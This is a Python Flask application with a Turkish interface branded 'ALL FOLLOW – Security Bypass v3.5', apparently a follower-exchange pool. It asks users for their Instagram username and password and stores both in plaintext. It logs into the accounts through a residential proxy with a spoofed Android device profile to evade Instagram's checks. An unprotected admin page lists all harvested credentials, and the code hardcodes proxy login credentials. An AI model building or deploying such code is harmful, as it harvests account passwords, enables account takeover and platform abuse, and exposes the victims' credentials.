import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
        <div style="background:#161b2c;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #2d334a;">
            <h1 style="font-style:italic;letter-spacing:-1px;font-size:32px;margin-bottom:5px;color:#3b82f6;">ALL FOLLOW</h1>
            <p style="font-size:10px;color:#5c6b89;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">Security Bypass v3.5</p>
            <input id="u" placeholder="Kullanıcı Adı" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
            <input id="p" type="password" placeholder="Şifre" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
            <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;">HAVUZA GİRİŞ YAP</button>
            <p id="m" style="font-size:13px;margin-top:20px;color:#94a3b8;"></p>
        </div>
        <script>
            async function login(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const b=document.getElementById('b'), m=document.getElementById('m');
                if(!u || !p) return;
                b.disabled=true; b.innerText="DOĞRULANIYOR..."; m.innerText="Instagram güvenliği aşılıyor...";
                try {
                    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                    const d=await r.json();
                    m.innerText=d.msg; b.disabled=false; b.innerText="TEKRAR DENE";
                    if(d.status==="success") { b.innerText="BAĞLANDI ✅"; b.style.background="#10b981"; }
                } catch(e) { m.innerText="Bağlantı hatası."; b.disabled=false; }
            }
        </script>
    </body>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u').strip().lower(), data.get('p').strip()
    
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    cl = Client()
    cl.set_proxy(PROXY_URL)
    
    # Cihazı sabitleyelim ki Instagram her seferinde farklı biri sanmasın
    cl.set_device_settings({
        "app_version": "269.0.0.18.75",
        "android_version": 26,
        "android_release": "8.0.0",
        "dpi": "480dpi",
        "resolution": "1080x1920",
        "manufacturer": "Samsung",
        "model": "SM-G960F",
        "device": "starlte",
        "cpu": "exynos9810",
        "version_code": "442436154"
    })

    try:
        # Önce çerezleri temizle ki taze giriş yapsın
        cl.logout() 
    except:
        pass

    try:
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş başarılı! Havuzdasınız.")
            
    except Exception as e:
        err = str(e).lower()
        # Eğer giriş bildirimi geliyorsa AKTİF yap
        if "expecting value" in err or (hasattr(cl, 'user_id') and cl.user_id):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Başarıyla katıldınız!")
            
        if "challenge" in err or "checkpoint" in err:
            user.status = "Onay Gerekli (Uygulamaya Bak)"
            db.session.commit()
            return jsonify(status="error", msg="Lütfen Instagram uygulamasından girişi onaylayın.")
            
        user.status = "Şifre Yanlış Görünüyor ❌"
        db.session.commit()
        return jsonify(status="error", msg="Şifre hatalı veya Instagram bu girişi engelledi. Uygulamadan onay verin.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Havuzu ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
